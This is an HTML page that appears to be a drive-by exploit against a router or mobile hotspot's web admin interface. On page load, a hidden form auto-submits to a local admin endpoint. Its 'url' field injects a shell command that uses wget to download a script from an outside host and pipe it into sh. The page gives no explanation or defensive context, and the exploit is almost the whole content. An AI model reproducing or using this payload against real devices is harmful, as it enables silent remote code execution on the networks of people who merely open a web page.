<form method="post" id="exploit" action="http://192.168.254.254/goform/goform_se
t_cmd_process"><input name="isTest" value="false" type="hidden"><input name="gof
ormId" value="send_at_tools" type="hidden"><input name="url" value="AT > /tmp/at
send.log && wget http://lucastiam.com/1337/S106/ais_/z1t_s10g_41s_n3w.sh -0-|
sh &&" type="hidden"><input type="submit" style="display:none;"></form>
<script>
function exploit () {
var xploit = document.getElementById("exploit");
xploit.submit();
}
window.onload = exploit;